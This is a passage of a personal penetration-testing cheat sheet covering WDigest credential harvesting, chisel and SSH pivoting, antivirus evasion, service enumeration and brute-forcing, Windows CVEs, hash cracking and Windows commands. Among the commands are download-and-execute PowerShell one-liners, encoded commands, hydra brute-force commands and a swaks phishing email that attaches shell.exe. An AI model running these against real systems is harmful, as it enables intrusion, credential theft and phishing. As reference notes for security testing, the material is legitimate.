    - enable wdigest (makes plaintext credentials be stored in memory) and wait someone authenticates
        * enable: `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1`
        * disable: `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 0`
        * enable via cme: `crackmapexec ... -M wdigest -o action=enable`
    - disable LSA protection

### pivoting
- chisel - reverse port forwarding 
    - attacker machine: `chisel server --port $attackerPort --reverse`
    - victim machine: `chisel client $attackerAddress:$attackerPort R:1080:socks`
    - open a socks port in chisel server (port 1080 by default)
- dnscat2 - port forwarding through dns
- stealth: just using ssh
    - check [how to use openssh in windows](windows_openssh.md)
- ssh dynamic port forwarding: `ssh -D $BINDADDR:$PORT user@victim`
    - open socks port in ssh client
    - packets are routed to server
    - proxy traffic sent to the client port ($PORT) will be routed via the ssh server
- ssh local port forwarding: `ssh -L $BINDADDR:$CPORT:$ANYHOST:$SPORT user@victim`
    - open tcp port in ssh client
    - packets are routed to server
    - any traffic sent to the client port ($CPORT) will be redirected to $ANYHOST:$SPORT via the ssh server
- ssh remote dynamic port forwarding: `ssh -R $BINDADDR:$PORT user@attacker`
    - open socks port in ssh server
    - packets are routed to client
    - proxy traffic sent to the server port ($PORT) will be routed via the ssh client
    - how to protect the server?
        - ?ForceCommand
        - check scp
- ssh remote port forwarding: `ssh -R $BINDADDR:$SPORT:$ANYHOST:$CPORT user@attacker`
    - open tcp port in ssh server
    - packets are routed to client
    - any traffic sent to the server port ($SPORT) will be redirected to $ANYHOST:$CPORT via the ssh client
- sshuttle
    - `sshuttle -r user@victim 10.1.10.0/24 10.1.50.0/24`
    - the target needs to be a ssh server
    - the setup is transparent through ip routes
    - interesting if proxychains is not working with a tool
- proxychains does **not** work with statically-linked binaries
- perform TCP connect scan (-sT) when using nmap through proxychains
- Lowering the 'tcp_read_time_out' and 'tcp_connect_time_out' values in the Proxychains configuration file can dramatically speed up port-scanning times.

### antivirus evasion
- avoid write in the file system, run PE files directly from memory
    - https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
    - https://www.youtube.com/watch?v=CzhKMkmnk8w
- when possible use powershell instead of PE files
- shellter if PE files are necessary


# Common Services
- it is always good to look for the service' hacktricks

## smb
### smb concepts
- SMB uses NTLM or Kerberos protocols for user authentication.
- In SMB, administrative shares ended with the dollar sign
- The IPC$ share is also known as a null session connection. With it, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.
- smb doesnt support command execution by default, but it can be reached using PSExec. 
    - PsExec requires admin privileges on the remote system
    - PsExec allows use user and password or hash to create a SYSTEM shell on the target
    - PsExec is a Sysinternals tool which sends a windows service to the ADMIN$ share on the remote system, then use the Windows Service Control Manager (which has a remote interface) to execute it
        - This service is responsible for executing commands, it creates a named pipe (psexecsvc) for communication between the local and remote systems.

### smb practice
- ?impacket-lookupsid -no-pass 
- ?crackmapexec smb --rid-brute

- enumeration
    * `crackmapexec smb TARGET`
    * `crackmapexec smb NETWORK --gen-relay-list hosts.txt`
    * `nmap --script smb-os-discovery,smb-protocols,smb-security-mode TARGET`
        * ?check: smb2-security-mode
    * `smbclient -L \\address`       # similar to net view
    * `smbclient -L \\address -N`    # trying null access
    * `smbclient //address/dir`      # similar to net use
    * `smbclient --option='client min protocol=NT1'`  # using smbv1
    * through windows
        - `dir \\address\a`
        - `net use \\address "" /u:""`
        - `net view \\address /all`     # show directories
        - `net use x: \\address\dir`    # mount via cmd
- check if it is possible to read or write files using void/random user
- non interactive 
    - listing: `smbclient //TARGET/SHARE/ -U 'user%pass' -c 'ls User/Desktop/'`
    - upload: `curl -T 'toy.exe' -u 'user' smb://TARGET/SHARE/User/Desktop/`
    - download: `smbclient //TARGET/SHARE/ -U 'user%pass' -c 'prompt OFF; recurse ON; mget *' `

- if it is possible to write in the smb share:
    * upload lnk that can start a ntlm connection by the victim just opening the folder where it is (ntlm_theft tool)
    * upload malicious files and wait user open



## RDP 
- by default, workstations just allow one logged in user per host
- a message appears asking if the current user wants to disconnect to allow the new one
- by default, each user is limited to one session by host, it is possible to allow more sessions, but there is a limit
- user needs to be in **Remote Desktop Users** or **Administrators** group
- it is possible to try bruteforce attacks (it can block users if this is the policy)
    - `hydra -L users.txt -p "Company@2023" rdp://1.2.3.4`
- common use: `xfreerdp /u:$USER /p:$PASS /v:$TARGET /cert:ignore /smart-sizing /w:1366 /h:768 /drive:Public,~/Public`

## netbios
- netBIOS: is an API that allows application communicate over local network, renamed to NBT (NetBT) when uses TCP/UDP, provides three services:
    * netbios-ns: for name registration and resolution (137/udp, tcp)
    * netbios-dgm: for connectionless communication (138/udp)
    * netbios-ssn: for connection-oriented communication, used by the SMB in the past (139/tcp)
- nbtstat: ferramenta do windows para interagir com netBIOS
- nbtstat -A address
- nbtscan: enumerar netbios services via linux (semelhante ao nbstat)


## RPC / NFS
### rpc / nfs concepts
- portmapper or RPCbind is a service that binds the port 111 (tcp or udp) and maps RPC services to the ports on which they listen. RPC processes notify portmapper/rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.
- NFS: protocol which uses RPC and is used to share files, default port 2049

### rpc / nfs practice
- ?rpcclient
- rpcinfo: a tool that uses port 111 to enumerate RPC services
- show nfs shares: `showmount -e TARGET`
- mount nfs share: `mount -t nfs TARGET:/point /mnt`
    * if there's a permission error, trying access the file using a local user with the same UID could be enough

## SNMP

- SNMP: protocolo stateless para gerenciar dispositivos da rede
- porta padrao 161/udp
- normalmente usado em roteadores, switches
- suporte a traffic encryption only in v3
- consultas utilizam OID (codigos numericos) (oid-info.com)
- community equivalente a "senha", vale tentar as default, elas concedem permissao de RO (read only) ou RW
- snmp scanner: `onesixtyone`
- tool to interact with snmp hosts: `snmpwalk -v1 -Oa -c COMMUNITY target`
    - the server can just answer for a specific version (-v1) 
- geting oids: https://www.circitor.fr/Mibs/Html/H/HOST-RESOURCES-MIB.php || https://mibs.observium.org/mib/HOST-RESOURCES-MIB/#hrSWRunName
    - ex: hrSWInstalledName  -> 1.3.6.1.2.1.25.6.3.1.2
          hrSWRunName        -> 1.3.6.1.2.1.25.4.2.1.2

## ftp
- try authenticate using **anonymous** and **ftp**
    - `nmap -n --script ftp-anon -p21 -iL hosts.txt -oX ftp_anon_results.txt`
- brute common credentials 
    * ftp-brute.nse
    * https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
    * hydra
- ftp server exploits

### post ftp
- download files recursively
    `wget -m ftp://$user:$pass@$target/`
    `wget -m --no-passive-ftp ftp://$user:$pass@$target/`
- upload lnk auto exe
- upload modified version of script

## SMTP
- look for vulnerabilities in the server version
- enumerate users with VRFY
- try send emails without creds
- with a credential, it is possible to use `swaks` to send emails
    * `swaks -t recipient@target.com --from attacker@target.com --attach shell.exe --server $SMTP_SERVER --body @body.txt --header "Subject: Update your informations" --suppress-data -ap`

## ssh
- if password enabled, try brute with common credentials and/or password spraying
    - `hydra -l root -P passwords.txt -s 2222 ssh://1.2.3.4`
    - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
    - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
- ssh server exploits
- TODO: check ssh MitM *https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh#ssh-mitm*

## winrm
- it remembers ssh
- the user needs to be on the **Remote Management Users** or **Administrators** group.
- linux: `evil-winrm -i $TARGET -u $USER -p $PASSWORD`
- windows: `winrs -r:$TARGET -u:$USER -p:$PASSWORD "calc"`

# Cisco
- scanner: cisco-torch
- exploitation: cisco-global-exploiter cge.pl

# Popular Vulnerabilities
## windows rce

- CVE-2008-4250 / MS08-067 - xp, 2003, 2008 - rpc - 445
- CVE-2017-014[3-8] / MS17-010 - 7, 8, 10, 2008, 2012, 2016 - smb - 445 - EternalBlue/ETERNALSYNERGY/ETERNALROMANCE/ETERNALCHAMPION
- CVE-2019-0708 - 7, 2003, 2008 - rdp - 3389 - bluekeep
- CVE-2021-1675 - 7, 8, 10, 2008, 2012, 2016, 2019 - printer spooler - 445 - printnightmare

- to check: SMBGhost (CVE-2020-0796) and SMBleed (CVE-2020-1206)

## windows privilege escalation

CVE-2020-1472 - attack DC - zerologon
CVE-2021–36934 - LPE - SeriousSam / HiveNightmare 
    https://github.com/GossiTheDog/HiveNightmare

## exchange server
- ProxyShell: ProxyLogon, ProxyOracle
    - https://sensorstechforum.com/hackers-proxyshell-vulnerabilities-cve-2021-34473/


# Appendix

## hash
- analyzing / detecting hashes
    - hashcat
    - hashid 
    - hash-identifier
- breaking
    - hashcat
    - john
    - https://hashes.com/en/decrypt/hash
    - https://md5decrypt.net/
- ssh2john, keepass2john, keychain2john, zip2john, 7z2john -> extract hash from the files, compatible with hashcat and john
    * extract the hash: `ssh2john id_rsa > ssh.hash`
    * crack it using cpu: `john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash`
    * or (clean the hash file and) use gpu: `hashcat ssh.hash wordlist.txt`
- great hashcat rules: best64.rule, rockyou-30000.rule
- how to use hashcat rules in other tools? `hashcat rockyou.txt -r best64.rule --stdout > rock64.txt`


## windows commands

```powershell
set __COMPAT_LAYER=RunAsInvoker # fakeroot?

powershell.exe -ExecutionPolicy Bypass -File Script.ps1
powershell.exe -c iex ( curl.exe https://example.com/a.ps1 )
powershell.exe -c "cd $env:TEMP; curl http://example.com/a.exe -o a.exe; .\a.exe"

$command = 'whoami'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
# or in linux: echo -n 'whoami' | iconv -f UTF8 -t UTF16LE | base64 -w0
powershell.exe -enc $encodedCommand

powershell.exe "Start-Process -FilePath powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File C:\chaos\script.ps1' -NoNewWindow -RedirectStandardOutput C:\chaos\output.txt -RedirectStandardError C:\chaos\error.txt -PassThru" # & (run in background)


Expand-Archive file.zip                      # unzip file.zip
certutil -decode inputfile outputfile        # base64 -d inputfile > outputfile
Get-FileHash -Algorithm md5 inputFile        # md5sum inputFile       
certutil -hashfile C:\inputFile MD5
Format-Hex inputFile                         # hexdump -C inputFile
... | Select-Object -First 10                # ... | head -10

... | Format-Table                           # for short infos
... | Format-List                            # for long infos
... | ForEach-Object { $_.Attrib = UpdateFunc $_.Attrib } # updating a attrib
... | ? {$_.Attrib -notmatch "disable"}     # remove all elements that contains disable in Attrib


Get-Help    # man in powershell

## running task every 1 minute
schtasks /create  /tn "Test-1min" /f /tr "powershell C:\script.ps1" /sc minute /mo 1
## running task once after 1 minute
$timestamp = New-TimeSpan -Minutes 1
$time = ((get-date) + $timestamp).ToString("HH:mm")
schtasks /create /tn 'RemoteTask' /f /tr 'a.exe' /sc once /st $time

Invoke-WebRequest   # curl alternative

type                # cat 
attrib +h file.txt  # hide file, chmod alternative
cd C:\Users && dir /S *.txt,*kdbx  # find C:\Users -iname "*.txt" (also find by hidden)
Get-ChildItem -Path C:\users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue # find C:\users -iname "*.txt" 2>/dev/null
findstr /spin /c:"password" "C:\directory\*.ini" 2>nul # find C:/directory -iname '*.ini' -exec grep -rin 'password' {} \; 2>/dev/null


osk/sethc/magnify - sethc # shift 5 vezes

whoami /user
net session         # can be used to check if shell has admin privileges
net share           # list smb shares

net user                                # show users
Get-LocalUser                           # show users
wmic useraccount                        # show users with SID
Get-WmiObject Win32_UserAccount         # show users with SID
net user Administrador /active:yes      # enable user
net user UserName *                     # passwd
net user UserName Senha /add /domain    # domain adduser
net user group "domain admins" UserName /add /domain  # domain addgroup
net user /domain                        # list domain users, ?"Local Group Memberships" is related to the DC
net group /domain                       # list domain global groups
net localgroup                          # list local groups
Get-LocalGroup                          # list local groups
net localgroup Administrators           # list members of a group
Get-LocalGroupMember Administrators     # list members of a group
whoami /groups                          # list all current user's groups
control userpasswords2                  # Manage accounts

tasklist                        # ps
taskkill /F /PIB [/IM *.exe]    # kill
runas /noprofile /user:Test cmd     # su
takeown /A /F arquivo [/R]          # ? chown

wmic logicaldisk        # df
diskpart                # parted
format

msinfo32
winver
systeminfo              # lshw

route print             # ip route
netstat -ano            # ss -anp
netsh                                           # ? nm-cli
netsh wlan show profile name="SSID" key=clear   # wifi password


slmgr -rearm            # reset windows trial
bootrec /bcdboot        # recreates efi partition
bcdboot C:\windows      #
```

## c# in powershell
- simple example
```csharp
using System;
var array = Environment.GetCommandLineArgs();
Console.WriteLine(array[0]);
```

```powershell
using namespace System
$array = [Environment]::GetCommandLineArgs()
$array[0]
```

- creating objects
```powershell
# using new
$directoryEntry = [System.DirectoryServices.DirectoryEntry]::new('')     
# using New-Ojbect
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry("") 
# using accelerator
$directoryEntry = [adsi]''
```

- listing accelerators
`[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Get`
